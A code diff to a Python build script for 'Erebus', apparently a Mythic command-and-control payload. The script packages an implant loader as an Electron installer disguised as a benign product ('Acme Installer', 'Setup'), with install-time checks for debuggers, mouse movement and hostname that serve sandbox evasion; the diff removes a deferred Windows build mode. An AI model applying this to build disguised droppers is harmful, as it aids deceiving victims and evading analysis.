@@ -37,11 +37,8 @@ AGENT_CODE = PKG_ROOT / "agent_code"
 TEMPLATES_DIR = AGENT_CODE / "templates"
 ELECTRON_PROJECT_SUBPATH = pathlib.Path("Erebus.Loaders") / "Erebus.Electron"
 
-# The source PNG ships vendored inside the Electron project's build/
-# directory so it lives inside the Docker COPY context (the repo's
-# top-level agent_icons/ is outside Payload_Type/ and isn't copied into
-# the Mythic container).
 ICON_SOURCE_NAME = "icon-source.png"
+_FALLBACK_ICON = AGENT_CODE / "Erebus.Loaders" / "Assets" / "Erebus.png"
 
 
 def _looks_like_svg(data: bytes) -> bool:
@@ -185,9 +182,12 @@ def _render_icon(
                 f"(SVG is rasterized to PNG via cairosvg)."
             ) from e
     else:
-        if not source_png.exists():
-            raise FileNotFoundError(f"icon source PNG missing: {source_png}")
-        img = Image.open(source_png)
+        icon_path = source_png if source_png.exists() else _FALLBACK_ICON
+        if not icon_path.exists():
+            raise FileNotFoundError(
+                f"No icon source found. Checked: {source_png}, {_FALLBACK_ICON}"
+            )
+        img = Image.open(icon_path)
 
     img = img.convert("RGBA")
     # Multi-resolution ICO: Windows picks the best size for each surface
@@ -390,10 +390,6 @@ def _find_nsis_output(dist_dir: pathlib.Path) -> Optional[pathlib.Path]:
     return fallback[0] if fallback else None
 
 
-def _sanitize_name(raw: str) -> str:
-    return "".join(c if c.isalnum() or c in "-_" else "_" for c in (raw or "ErebusInstaller"))
-
-
 def build_electron_installer(
     build_path: pathlib.Path,
     product: str = "Acme Installer",
@@ -403,7 +399,6 @@ def build_electron_installer(
     entry_format: str = "exe",
     entry_name: str = "erebus.exe",
     dll_entry: str = "DllMain",
-    build_mode: str = "In-Container (Wine)",
     file_description: str = "Setup",
     copyright_str: str = "",
     custom_icon_bytes: Optional[bytes] = None,
@@ -420,7 +415,6 @@ def build_electron_installer(
     :param entry_format: "exe" | "dll" | "xll".
     :param entry_name: Filename inside payload/ to spawn (e.g. "erebus.exe").
     :param dll_entry: rundll32 entry point name (only used when entry_format == "dll").
-    :param build_mode: "In-Container (Wine)" or "Deferred (Erebus.Helper)".
     :param custom_icon_bytes: Optional raw PNG bytes uploaded via the
         "3.E6a Electron Custom Icon" BuildParameter. Overrides the
         vendored default Erebus icon when supplied.
@@ -429,8 +423,7 @@ def build_electron_installer(
         BuildParameters (enabled, dwellMs, requireMouseMovement,
         checkDebugger, hostnameWhitelist, ...). When omitted or
         ``enabled=False``, no guardrails run at install time.
-    :return: Path to the produced file placed in payload/ (NSIS installer
-             for in-container mode, marker readme for deferred mode).
+    :return: Path to the produced NSIS installer placed in payload/.
     """
     payload_dir = build_path / "payload"
     if not payload_dir.exists():
@@ -468,90 +461,44 @@ def build_electron_installer(
         custom_bytes=custom_icon_bytes,
     )
 
-    if build_mode == "In-Container (Wine)":
-        # Wine + electron-builder is slow even after caches are prewarmed:
-        # rcedit alone takes ~30s, NSIS pack another ~30-60s on cold wine.
-        # Cap at 15 minutes to surface stalled builds with a useful error
-        # rather than a silent timeout from whatever harness is calling us.
-        try:
-            proc = subprocess.run(
-                ["make", "-C", str(project_dir), f"ARCH={arch}", "release"],
-                capture_output=True,
-                text=True,
-                timeout=900,
-            )
-        except subprocess.TimeoutExpired as e:
-            raise RuntimeError(
-                "Electron in-container build exceeded 15 minute timeout. "
-                "Check that node_modules and ELECTRON_*_CACHE were prewarmed "
-                "in the Docker image; a cold build re-downloads ~400 npm "
-                "deps + electron + winCodeSign + nsis-resources via wine.\n"
-                f"partial stdout:\n{(e.stdout or b'').decode(errors='replace') if isinstance(e.stdout, (bytes, bytearray)) else (e.stdout or '')}\n"
-                f"partial stderr:\n{(e.stderr or b'').decode(errors='replace') if isinstance(e.stderr, (bytes, bytearray)) else (e.stderr or '')}"
-            ) from e
-        if proc.returncode != 0:
-            raise RuntimeError(
-                f"Electron in-container build failed ({proc.returncode}):\n"
-                f"stdout:\n{proc.stdout}\nstderr:\n{proc.stderr}"
-            )
+    # Wine + electron-builder is slow even after caches are prewarmed:
+    # rcedit alone takes ~30s, NSIS pack another ~30-60s on cold wine.
+    # Cap at 15 minutes to surface stalled builds with a useful error
+    # rather than a silent timeout from whatever harness is calling us.
+    try:
+        proc = subprocess.run(
+            ["make", "-C", str(project_dir), f"ARCH={arch}", "release"],
+            capture_output=True,
+            text=True,
+            timeout=900,
+        )
+    except subprocess.TimeoutExpired as e:
+        raise RuntimeError(
+            "Electron in-container build exceeded 15 minute timeout. "
+            "Check that node_modules and ELECTRON_*_CACHE were prewarmed "
+            "in the Docker image; a cold build re-downloads ~400 npm "
+            "deps + electron + winCodeSign + nsis-resources via wine.\n"
+            f"partial stdout:\n{(e.stdout or b'').decode(errors='replace') if isinstance(e.stdout, (bytes, bytearray)) else (e.stdout or '')}\n"
+            f"partial stderr:\n{(e.stderr or b'').decode(errors='replace') if isinstance(e.stderr, (bytes, bytearray)) else (e.stderr or '')}"
+        ) from e
+    if proc.returncode != 0:
+        raise RuntimeError(
+            f"Electron in-container build failed ({proc.returncode}):\n"
+            f"stdout:\n{proc.stdout}\nstderr:\n{proc.stderr}"
+        )
 
-        nsis = _find_nsis_output(project_dir / "dist")
-        if nsis is None:
-            raise RuntimeError(f"electron-builder succeeded but no .exe found in {project_dir / 'dist'}")
+    nsis = _find_nsis_output(project_dir / "dist")
+    if nsis is None:
+        raise RuntimeError(f"electron-builder succeeded but no .exe found in {project_dir / 'dist'}")
 
-        # Replace payload/ contents with exactly ONE file: the portable
-        # Electron exe, named erebus.exe so the existing signing stage
-        # (which hardcodes payload/erebus.{fmt}) finds it without a bypass.
-        final_path = payload_dir / "erebus.exe"
-        for item in list(payload_dir.iterdir()):
-            if item.is_file():
-                item.unlink()
-            elif item.is_dir():
-                shutil.rmtree(item)
-        shutil.copy2(str(nsis), str(final_path))
-        return final_path
-
-    # Deferred mode: stage the Electron project tree + runbook for Windows-side build.
-    staged_src = payload_dir / "electron_src"
-    if staged_src.exists():
-        shutil.rmtree(staged_src)
-    shutil.copytree(
-        str(project_dir),
-        str(staged_src),
-        ignore=shutil.ignore_patterns("node_modules", "dist", "build"),
-    )
-    # Re-stage the loader payload inside the deferred project tree so that
-    # when the operator runs the .bat on Windows, electron-builder finds
-    # build/resources/payload/.
-    deferred_resources = staged_src / "build" / "resources" / "payload"
-    deferred_resources.mkdir(parents=True, exist_ok=True)
-    for item in payload_dir.iterdir():
-        if item.name == "electron_src" or item.name == "build_electron.bat":
-            continue
-        if item.is_dir():
-            shutil.copytree(str(item), str(deferred_resources / item.name))
-        elif item.is_file():
-            shutil.copy2(str(item), str(deferred_resources / item.name))
-
-    safe_product = _sanitize_name(product)
-    installer_name = f"{safe_product}-Setup.exe"
-    bat_lines = [
-        "@echo off",
-        "REM Build the Erebus.Electron fake-installer on a Windows host.",
-        "REM Requires: Node.js 20 LTS + npm + Python (for erebus_helper.py).",
-        "setlocal",
-        'cd /d "%~dp0"',
-        f'python erebus_helper.py electron --project-dir "electron_src" --output "{installer_name}" --arch {arch}',
-        "echo Electron installer built: %errorlevel%",
-        "endlocal",
-    ]
-    bat_path = payload_dir / "build_electron.bat"
-    bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
-
-    marker = payload_dir / "electron_src.readme.txt"
-    marker.write_text(
-        "Erebus.Electron loader staged for deferred Windows build.\n"
-        f"Run build_electron.bat on a Windows host to produce {installer_name}.\n",
-        encoding="utf-8",
-    )
-    return marker
+    # Replace payload/ contents with exactly ONE file: the portable
+    # Electron exe, named erebus.exe so the existing signing stage
+    # (which hardcodes payload/erebus.{fmt}) finds it without a bypass.
+    final_path = payload_dir / "erebus.exe"
+    for item in list(payload_dir.iterdir()):
+        if item.is_file():
+            item.unlink()
+        elif item.is_dir():
+            shutil.rmtree(item)
+    shutil.copy2(str(nsis), str(final_path))
+    return final_path
